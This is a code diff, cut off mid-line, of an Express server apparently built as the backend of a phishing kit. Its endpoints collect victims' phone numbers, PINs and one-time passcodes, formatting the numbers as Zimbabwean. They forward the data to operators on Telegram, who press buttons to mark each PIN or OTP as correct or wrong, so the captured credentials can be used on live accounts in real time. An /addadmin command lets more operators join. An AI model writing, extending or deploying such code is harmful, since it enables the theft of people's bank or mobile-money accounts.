@@ -17,10 +17,8 @@ app.use(express.static(publicPath));
 // Persistent storage file path
 const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
 
-// 1. Declare state variables FIRST so functions can reference them safely
 const activeApplications = new Map();
 
-// Load initial data from disk if it exists
 function loadPersistentData() {
   try {
     if (fs.existsSync(STORAGE_FILE)) {
@@ -50,7 +48,6 @@ const secondaryAdmins = persisted.secondaryAdmins;
 const pathToAdminChat = persisted.pathToAdminChat;
 let adminCounter = persisted.adminCounter;
 
-// Save current maps to disk
 function savePersistentData() {
   try {
     const dataToSave = {
@@ -77,7 +74,6 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// Helper to edit Telegram messages cleanly
 async function editTelegramMessage(botToken, chatId, messageId, newText, replyMarkup = null) {
   try {
     const payload = {
@@ -99,7 +95,6 @@ async function editTelegramMessage(botToken, chatId, messageId, newText, replyMa
   }
 }
 
-// STEP 2 SUBMISSION: Delivered to Telegram with Phone and PIN + Action Buttons
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -168,7 +163,6 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: Delivered with Ref and OTP only (Phone and PIN removed)
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -219,7 +213,6 @@ app.post('/api/submit-otp', async (req, res) => {
   }
 });
 
-// Status Polling Endpoint
 app.get('/api/check-status/:appReference', (req, res) => {
   const { appReference } = req.params;
   const appData = activeApplications.get(appReference);
@@ -231,7 +224,6 @@ app.get('/api/check-status/:appReference', (req, res) => {
   res.json({ success: true, status: appData.status });
 });
 
-// Telegram Webhook Handler
 app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -243,7 +235,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const chatId = message.chat.id.toString();
     const user = message.from;
 
-    // Main Admin command to directly add an unlimited secondary admin by Chat ID: /addadmin <chatId>
     if (chatId === masterChatId.toString() && text.startsWith('/addadmin')) {
       const parts = text.split(' ');
       if (parts.length < 2) {
@@ -509,4 +500,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  let
+  let targetAppRef = '';
+  if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
+  if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
+  if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
+  if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');
+
+  if (targetAppRef) {
+    const appData = activeApplications.get(targetAppRef);
+    if (appDat
